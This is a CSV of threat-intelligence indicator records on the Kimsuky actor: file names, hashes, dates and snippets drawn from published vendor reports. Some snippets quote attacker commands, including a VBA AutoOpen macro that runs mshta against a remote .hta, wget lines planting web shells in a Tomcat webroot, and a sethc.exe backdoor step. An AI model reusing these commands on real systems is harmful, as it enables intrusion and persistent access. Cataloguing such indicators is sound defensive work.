1.0.0,actor--kimsuky,artifact--sha256:361269e9bd064136494a7cf35fd1c3f69ed094a96e7d1145cffa121c6b9d31d8,observation--sha256:35815e049a6ac7e8f1c1d033e7e7935af25b44b90434c7153ddac2450ab57f02,file-name,Utilman2.exe,Utilman2.exe,candidate,2018-10-26T00:00:00Z,day,known,same-record,2019-02-01T00:00:00Z,source--babyshark-xlsx,baby-kimsuky/BabyShark Rule - Mal Cert and others.xlsx,"{""row"": 11, ""sheet"": ""check-results_Venom23-155099628""}",[],"[""malware--babyshark""]",[],"[""payload""]",0,false,high,TLP:CLEAR,xlsx-row,"9b37ae1f0a03add0a5399e8ffaa06e53528fb07ed712b9332876e1cd927d61e6 suspicious MAL_PE_Type_BabyShark_Loader 2 - Utilman2.exe 2018-10-26 18:41:57 UTC ( 4 months ago ) 2018-12-21 15:54:21 Win32 EXE a7a45c41158921f730178cf8f4669460 d3b2aa1e3559924358af7c713bbbd51e917b93a7 9b37ae1f0a03add0a5399e8ffaa06e53528fb07ed712b9332876e1cd927d61e6 7c2fe91f7d68a9dcbf1d8cc02b006863 False True False False False EGIS Co., Ltd. False False False True - - - - - - - - - - -",
1.0.0,actor--kimsuky,artifact--sha256:d31e1ddf410ceb118044e034831f0d91f7f25ba199d568dae72dfb313ff8d13a,observation--sha256:267a01268a92f54a07ca042dc04fd5e277c8c99e5952e034483d293d110a9010,file-name,V2.47.zip,V2.47.zip,candidate,2022-08-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"There is a history, and malicious URLs with similar patterns are registered for each IP. At first glance, the common characteristics of malicious URLs are navernnail.com URL explanation RdpScan_La05_1226_x64.rar ZOOKAgentSetup.zip 41 (Figure 28) Malicious document execution and C2 communication 61.82.110.60(KR) navernnail.com IP Operation Covert Stalker Report navernnail.com It is very important information in profiling because it can track and identify hacking activities, and is a very importan",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:463c2108c9fd1e5909a91ea30c027b6454f859804477a25da146d9123eed2601,observation--sha256:57a0f20294ec4c11675cdf246ef52c1a12e264c737d26711959c0f423a83481d,file-name,VB2020-46.pdf,VB2020-46.pdf,candidate,,unknown,unknown,invalid-calendar-date:same-record,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 26}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 26 VIRUS BULLETIN CONFERENCE OCTOBER 2021 CONCLUSION Kimsuky group is a threat group that has been actively conducting cyber threat attacks from the past cyber terrorism of KHNP to recently targeting various research institutes. Through the Operation Newton case, we looked at the butterfly effect of the attack by the Kimsuky group, which started with simple account takeover phishing that many people may easily overlook or",
1.0.0,actor--kimsuky,artifact--sha256:b0d6c0b96589fa7329c7ede76456d7ae1474b31b3d15ce87d8f4e3c2222f8fa4,observation--sha256:35913679fac14b7939a7008dd1b1c337bdd40f8478ec61b353853863de326888,file-name,Vaccine.apk,Vaccine.apk,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 c 上传截图 d 上传文件 e 上传键盘记录、屏幕截图、文件监控、USB 监控数据 f 下载文件 0 CmdShell 1 下载 Dll 模块使用 regsvr32 加载执行 2 内存加载执行 PE 模块 3 下载文件并执行 其中键盘记录、屏幕截图、文件监控、USB 监控被放到单独线程中执行，除键盘记录 为即时监控外，文件监控频率为 60 秒，屏幕监控频率为 300 秒。而在文件监控中，木马针 对 txt、hwp、pdf、doc、xls、ppt 文档类型文件进行窃取，表明攻击者对此类文件非常感兴 趣。 图[13].窃取文件流程中特定的文档类型 3.4 间谍模块-Android 文件名称 Kisa Vaccine.apk SHA256 fe1a734019f0dc714bd3360e2369853ea97c02f108afe96376931893447 0967b,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:22ffc9497fe3b6d31027b01b38ca732616f4ec59a2b2079c5a4c86800514e05b,observation--sha256:3e3830bf751648fa119f4bab5e59f3d6884bae40d013077f76e3a40452faa1b9,file-name,Vkggy0.hta,Vkggy0.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 7}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,".Forward = True .Wrap = wdFindContinue .MatchWholeWord = True End With Selection.Find.Execute Replace:=wdReplaceAll End Sub Sub AutoOpen() Shell (""mshta https://tdalpacafarm[.]com/files/kr/contents/Vkggy0.hta"") End Sub If the 'Vkggy0.hta' in the code above is loaded normally, it will receive an HTTP GET response by executing the internal VBScript command and the additional PowerShell commands would be subsequently executed. The recently found malicious document files also have the same sequence ",
1.0.0,actor--kimsuky,artifact--sha256:97eb9eafd4c2a306a7aabe5001bd2e3e71905ce9742d37e5e8722468b1d9a05b,observation--sha256:e5b3bcc5d971a76a6297781e221b678caf35110384e9a01ad1ee009986392623,file-name,WDFSync.dll,WDFSync.dll,candidate,2021-05-07T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 源 RAT 样本发现，该样本使用的 C2 服务器与上述服务器被解析为同一个 IP 地址（104.1 28.239.70）。 MD5 c861f25bb943f77a909b33d62bb71926 SHA1 576b953cb4fe71adb71a338a42524b0e424824c1 SHA256 fd59597169668b90c47d0ad6db1bcd7d778c6d54ee3c42bdd2d86b2d2d34 c885 文件大小 485888 字节 (474.50 KB) 文件格式 PE64 DLL 编译时间 2021/05/07 05:06:47 C&C anto.shore.ml 通过 regsvr32.exe 启动该 RAT，并调用恶意流程入口点 DllRegisterServer。 图[9].RAT 模块的导出表 执行后首先进行安装流程，自我复制到以下目录： C:\\ProgramData\\Software\\Microsoft\\Windows\\MDF\\WDFSync,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ed8f15f85e1a78797f7661d5bc592d218b350246756089ddb88d4d77a38ea31f,observation--sha256:a704a758272c1ee55730606c18da506b3bf6317afef731c94a983be50baea31d,file-name,Webadmin.php,Webadmin.php,candidate,2020-09-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"lcs.never.com.ru never.com.ru (Table 12) Malicious URLs mapped to IP Disguised with similar file names. AhnLab is tracking and analyzing Kimsuky's operation and We store and store data stolen by sending phishing emails to specific people or organizations working in North Korea, politics, diplomacy, and security. Google search, etc. 35 1.243.200.130(KR) mi.never.com.ru cc.never.com.ru period Operation Covert Stalker Report We have kept many traces such as files and actions that can identify the o",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5604ca77149a4335437f65b56354e3d4f456f8d0f307123d7cf54c15f05adc84,observation--sha256:8005b07b2631c283642680b40cd30cc42d425b385899d1c7af7db6f1323545d0,file-name,Wemix_Championship_2023_Poster.pdf,Wemix_Championship_2023_Poster.pdf,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 85}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Connect to 17:24:22 211.249.220.24:443 (Table 48) Malware behavior log of 14*.10*.23*.21*(US) mshta.exe Operation Covert Stalker Report process 85 17:24:22 N/A N/A Submit v.doc.exe 2023-07-14 N/A It is designed to download and execute malicious code, but at the time of analysis, it is converted into a decoy file and malicious code as shown below (Figure 66). Deletes executable mshta.exe Myeon Golf Chairman.exe The malicious code in the above (Table 48), the malicious code disclosed on the ASEC b",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f39d41e06b57951dccad5b830d4e440b9a277ae9d93c3cb221106e67a64f205d,observation--sha256:bdc1d682d14770d0c12a686b3e945f9e5afce31cd6e12ee9375515c7cd8371d7,file-name,Win32Project1.pdb,Win32Project1.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 15}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 d726d8ee222ab6855e4486cbba671827489de312e56966dd71a289098244c752 e4aef7e31a4169d2dc4356502e3ab2bc3009d32cf95e8357a58a82dfd4b17878 5cca00063272921043ccbf1bc9aa434a438078b317b1b168840abbbc8b97fd68 dbe5d2dfe2cabb40c2ce1c1127297094b41734daf33e9308b742c72eb2185b70 Pdb D:\MyWork\PrevWork\취약점자료\IE\2021\Work\Final\splwow64_poc\x64\Release\splwo w64_poc.pdb D:\MyWork\PrevWork\취약점자료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\C,
1.0.0,actor--kimsuky,artifact--sha256:f39d41e06b57951dccad5b830d4e440b9a277ae9d93c3cb221106e67a64f205d,observation--sha256:fc3068cc1edcccd19e06c334af904ca3e8acc09de1b987510a716e05abd6808b,file-name,Win32Project1.pdb,Win32Project1.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:42bba8bb24b886ea552001df7f0cf66655a1a9f740ef0659d6f05e624bbb35e5,observation--sha256:2b08100ef0ddcbe1b33d9f0644fd1ef183d5faaa3b655a362df90cec46da4b6d,file-name,Xtgnb0.hta,Xtgnb0.hta,candidate,2019-02-14T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 20}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,[그림 9-1] Document created by 'John Harvey' is modified by 'windowsmb' File Name OFT.docm Last Modified Date (KST) 2019-02-14 23:08 Last Modified Name JamFedura C2 http://192.186.142[.]74/cache/Fwvuj0.hta MD5 304d86463a1fff5183aacc17ef2b3730 File Name bot spec.docm Last Modified Date (KST) 2019-02-18 17:30 Last Modified Name JamFedura C2 http://192.186.142[.]74/mn/Xtgnb0.hta MD5 f816a9c4a3415e8bae807c09e0f80b38 File Name white_paper.doc Last Modified Date (KST) 2019-02-19 17:29 Last Modified Name,
1.0.0,actor--kimsuky,artifact--sha256:aa39e07b461877948819eabb0ce563ac1fedd5aa218774fa08ad889bcf62b945,observation--sha256:a21c2271c85cd23a5a776079bfd68cd55dfcab3004f62aef6df85056cd963353,file-name,Yluhi0.hta,Yluhi0.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 16}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- http://seoulhobi[.]biz/how/fmaov0.hta - http://192.186.142[.]74/cache/fwvuj0.hta - http://192.186.142[.]74/cache/expres.php?op=1 - http://192.186.142[.]74/cache/expres.php?op=2 - http://192.186.142[.]74/cache/cow.php?op=exe.gif - http://192.186.142[.]74/cache/cow.php?op=cow.gif - http://192.186.142[.]74/cache/upload.php - http://192.186.142[.]74/mn/xtgnb0.hta - http://192.186.142[.]74/post/Yluhi0.hta - http://192.186.142[.]74/dll/Mylqn0.hta - http://192.186.142[.]74/lib/szgfj0.hta - http://192,
1.0.0,actor--kimsuky,artifact--sha256:aa39e07b461877948819eabb0ce563ac1fedd5aa218774fa08ad889bcf62b945,observation--sha256:aa2c8467d925af080ea53b22968f59e35168a5658fa10c16b56667cabcef52f8,file-name,Yluhi0.hta,Yluhi0.hta,candidate,2019-02-22T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 21}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,MD5 4118b251c977a682ebb4993601b9a7e3 File Name Schedule_.doc Last Modified Date (KST) 2019-02-22 17:09 Last Modified Name JamFedura C2 http://192.186.142[.]74/post/Yluhi0.hta MD5 29fbf69e72c0daac57d2cbba11bbfaa5 File Name xCryptoCrash_Schedule.doc Last Modified Date (KST) 2019-02-25 02:26 Last Modified Name JamFedura C2 http://192.186.142[.]74/post/Yluhi0.hta MD5 397ba1d0601558dfe34cd5aafaedd18e File Name white_paper.doc Last Modified Date (KST) 2019-02-26 15:40 Last Modified Name JamFedura C2 h,
1.0.0,actor--kimsuky,artifact--sha256:35ddf3792833ec8b539fcea0b98632196d18fdfb55184288b354c43c412d2a37,observation--sha256:a69c0c6573dc92bd531deda22ea99c3600ce90375a424d8dd4158a4ff1923bbe,file-name,ZOOKAgentSetup.zip,ZOOKAgentSetup.zip,candidate,2022-08-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"There is a history, and malicious URLs with similar patterns are registered for each IP. At first glance, the common characteristics of malicious URLs are navernnail.com URL explanation RdpScan_La05_1226_x64.rar ZOOKAgentSetup.zip 41 (Figure 28) Malicious document execution and C2 communication 61.82.110.60(KR) navernnail.com IP Operation Covert Stalker Report navernnail.com It is very important information in profiling because it can track and identify hacking activities, and is a very importan",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b9fb7f099af380ef84295f737bb79a02b77b37e9756da82960c7b1abbee12805,observation--sha256:59a719656a6f058b6271569ffd646628bcb0e85b9e3dde7dd150595c4de8ec78,file-name,_2023_Poster.pdf,_2023_Poster.pdf,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:62323f004c33f2838e05816debf1fdf9f631564199850ec8be6ee3d63ab0cb60,observation--sha256:882b83900b4453e965e1f494492daad208f10a2bf46e354ef3f2ab1f4884d106,file-name,_x64.rar,_x64.rar,candidate,2022-04-12T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 67}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"_x64.rar AhnLab disclosed the analysis information on the ASEC blog around the time of work on Friday, April 29, 2022. Before that, the Kimsuky organization hacked namastte and used 6*.3*.5*.20 to access the uploaded web shell. *(KR), a total of 2 IPs including 118.128.149.119(KR) were used for malware testing. 6*.3*.5*.20*(KR) hxxp://www.namastte.kr/sources/Util/AJAX.php?fpath=/home/nam astte/html/ sources/Util/temp/mmtool&fopen=RdpScan_La05_122 15:29:58 15:53:55 ÿ IP connected to namastte web ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:be33baf835de58b713d2cd18b82e15cca6bbe4967bc4001ed99999ce835074b3,observation--sha256:ebf3af659a81575d3b5cf8518fee58a5423c7c2d501f069300104cb7639b98e0,file-name,a.exe,a.exe,candidate,2023-05-09T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Since it is 2023-05-09, there is a time difference with RDP (CVE-2019-0708) vulnerability scanning, but mail analysis and 11*.16*.7*.12*(KR) 16 (Figure 7) System information of 20*.23*.16*.5*(KR) (hxxps://www.criminalip.io) Based on the collected malicious behavior analysis results, the Kimsuky organization sent hacking emails to specific people working in the North Korea sector. Below (Table 1) shows some of the RDP (CVE-2019-0708) vulnerability scanning activities collected from 11*.16*.7*.12*",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:be33baf835de58b713d2cd18b82e15cca6bbe4967bc4001ed99999ce835074b3,observation--sha256:12c2bbf8eabdcb20e4a8e21690a426bfb8dfb59239e0ff993282f9ad619f5ff8,file-name,a.exe,a.exe,candidate,2023-03-15T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ a.exe and r_sethc_x64.exe ÿ rdpscan_ksb04.exe The results of analyzing the characteristics and operation method of each scanner are as follows. It is used, and depending on the results, the malicious code content to be transmitted to the system where the RDP (CVE-2019-0708) vulnerability exists is also determined. Operation Covert Stalker Report It may vary. (See Figure 9, Table 2 below) To run a.exe and r_sethc_x64.exe properly, Atk.txt is required, and the file is scanned for RDP (CVE-2019-0",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:be33baf835de58b713d2cd18b82e15cca6bbe4967bc4001ed99999ce835074b3,observation--sha256:0aeca32c01db3f2d731ea0f730894df0c0dd1090c35dd921157911d69feb8cba,file-name,a.exe,a.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:be33baf835de58b713d2cd18b82e15cca6bbe4967bc4001ed99999ce835074b3,observation--sha256:a59333de4cbd19d5d710c6d07de21dee0f443e12222040227f225ab0b5cab218,file-name,a.exe,a.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:93cd13212aaca829a62d3cbb06c5290b7295b7e970de2f1e762f8c78d9faf7bc,observation--sha256:e7119324993083bcaaf0bbf5995bb655ad2e091bb22c368e23f88426d1545f77,file-name,a_1226.exe,a_1226.exe,candidate,2023-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 53}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"53 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsx6519.php HackTool/Win.RdpScan.R437610 Second, 27.255.***.***, where the webshell URL is mapped, is the IP assigned to this host and is an IP band frequently used by the Kimsuky organization when building C2. 27.255.80.170(KR) hxxps://a1ive.info/tygygvftsfx8g68Gu8 x7s78gsx6.php 2023-04-13 3 4 I used it. In the table below (Table 24), excluding webshell URLs 14 and 15, three patterns can be found in webshell URLs 1 to 13. C:\Users\DefaultUser\D",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8acc889eebfccb02e85daf2b0e84a8f78815f74ac3fb369ddf9cd8e5a966bcd2,observation--sha256:4e482f4787038149fa3fe11e4655b00aa6459bea7c7b1af8f717e2c61c3360fc,file-name,aa_nts.dll,aa_nts.dll,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Detect attempts to svchost.exe N/A (Table 6) Behavior log of Ammy RAT installation process 17:12:05 Operation Covert Stalker Report Target Process rundll32.exe Creates executable file ntrol\SafeBoot\Network\ts 2023-07-14 cmd.exe svchost.exe N/A It is Fileless. Connects to network 188.42.129.148:80(LU) aa_nts.dll Behavior 2) BlackBit ransomware infection svchost.exe process Report Time 17:12:03 Target aa_nts.dll (Ammy RAT) kmanager N/A 2023-07-14 N/A (Figure 15) File structure of BlackBit ransomw,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9b9c67d94c4941c389a37fd541032e09b0d20355c40acd0736c1b60ce63c3d1d,observation--sha256:e06082d708ca1a4b70d3470f912aa8e37e43470b7e44e59b6458b81642c4be02,file-name,about3.jsp,about3.jsp,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:e78a250af37ddb15dc4cfbf00fbeab72321d73e6e189256483cb986cb0752f4c,observation--sha256:d1f18ecf0d26d1f9714105a8386436ceaea186e58f540c240f8957cf6372e1cd,file-name,admin_x64_2003.exe,admin_x64_2003.exe,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6ead0ba9053cec49525bdfc0dc2d1f03a55984e2ae6ea3de5a21f4fa524f328a,observation--sha256:a3c747a18ae67dd5d63de3da7bd3491d2be904c64384495ed480a90b47d865a1,file-name,admin_x86_2003.exe,admin_x86_2003.exe,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:722e55918b505630cc8f1ec631f91ca49843fda54415e7d415dd71730bd53732,observation--sha256:8bfa3898e430b58259fb233214b82c55eefb98ed9800194d70532535578586cd,file-name,advanced_port_scanner.exe,advanced_port_scanner.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6e9fca2770c65b1e41faa5c61f0becee91e89c6188d8c6cd221f5f2d3a61b638,observation--sha256:5b350427dfb812d7a7a880071694203ba2fe6b166d0f4ca4c0d7679372363e4f,file-name,advanced_port_scanner_console.exe,advanced_port_scanner_console.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
